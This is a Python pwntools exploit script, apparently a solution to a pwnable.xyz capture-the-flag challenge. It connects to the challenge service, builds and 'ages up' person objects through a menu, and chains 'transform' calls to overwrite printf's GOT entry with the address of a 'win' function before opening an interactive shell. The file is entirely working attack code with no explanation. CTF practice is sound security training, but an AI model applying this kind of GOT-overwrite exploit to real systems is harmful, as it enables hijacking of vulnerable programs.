from pwn import *

#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30038)

def age_up(person):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter(': ', str(person))


def create_child(age, name, job):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter(': ', str(age))
    sh.sendlineafter(': ', name)
    sh.sendlineafter(': ', job)

def create_adult(age, name, job):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter(': ', str(age))
    sh.sendlineafter(': ', name)
    sh.sendlineafter(': ', job)


def transform(person, name, job):
    sh.sendlineafter('> ', '5')
    sh.sendlineafter(': ', str(person))
    sh.sendlineafter(': ', name)
    sh.sendlineafter(': ', job)

def delete_person(person):
    sh.sendlineafter('> ', '6')
    sh.sendlineafter(': ', str(person))


printf_got = 0x602060
win = 0x4009b3
create_child(17, "A"*0xf, "B"*0x1f)

age_up(0)
create_child(15, "C"*0xf, "D"*0x1f)
transform(0, "pangian", "fuck")
for i in range(0, 72):
    age_up(0)
transform(0, "A", "7")
transform(0, "A", p64(printf_got))
transform(1, "A", "B")
transform(1, "A", p64(win))



sh.interactive()

